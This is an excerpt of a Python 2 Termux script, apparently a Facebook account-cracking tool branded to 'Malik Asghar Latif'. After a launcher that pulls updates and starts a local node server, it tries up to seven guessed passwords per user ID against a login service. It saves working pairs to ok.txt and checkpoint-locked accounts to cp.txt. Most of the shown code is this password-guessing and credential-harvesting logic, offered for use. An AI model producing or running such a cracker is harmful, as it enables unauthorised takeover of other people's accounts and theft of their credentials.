...
os.system('git pull')
if not os.path.isfile('/data/data/com.termux/files/home/hst/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && npm install')
    os.system('cd ..... && node index.js &')
    os.system('clear')
    print '\x1b[1;34mWelCome To Asghar Latif Tool\x1b[0;97m'
    os.system('xdg-open https://www.facebook.com/malikasghar.latif.9')
    time.sleep(3)
elif os.path.isfile('/data/data/com.termux/files/home/hst/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && node index.js &')
    os.system('clear')
...
def logo():
    os.system('echo -e "\n\n                      \n __  __          _      _____ _  __      \n|  \/  |   /\   | |    |_   _| |/ /     \n| \  / |  /  \  | |      | | | . /       \n| |\/| | / /\ \ | |      | | | | <       \n| |  | |/ ____ \| |____ _| |_| . \      \n|_|  |_/_/    \_\______|_____|_|\_\      \n                       \n              \n    \n                                    \n             \n    \n     \n  \n                                   \n \xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9aMalik Asghar Latif\xf0\x9f\x91\x91\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a" | lolcat')
...
def method_menu():
    ...
    logo()
    print ''
    print '\t\x1b[1;31m WelCome To Malik Asghar Tool \x1b[0;97m'
    print ''
    print '\t\x1b[1;34m[1] Slow \x1b[0;97m'
    print '\t\x1b[1;31m[2] Fast \x1b[0;97m'
    print ''
    method_menu_select()


def method_menu_select():
    afza = raw_input('\t\x1b[1;34m Choose Options >>>\x1b[0;97m ')
    if afza == '1':
        b_menu()
    elif afza == '2':
        l_menu()
...
def l_menu_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;34m[Successful] \x1b[1;34m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31m[Checkpoint] \x1b[1;31m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;34m[Successful] \x1b[1;34m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31m[Checkpoint] \x1b[1;31m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;34m[Successful] \x1b[1;34m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31m[Checkpoint] \x1b[1;31m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;34m[Successful] \x1b[1;34m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31m[Checkpoint] \x1b[1;31m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;34m[Successful] \x1b[1;34m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31m[Checkpoint] \x1b[1;31m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;34m[Successful] \x1b[1;34m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31m[Checkpoint] \x1b[1;31m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;34m[Successful] \x1b[1;34m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1:31m[Checkpoint] \x1b[1:31m' + uid + ' | ' + pass7 + 'a\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
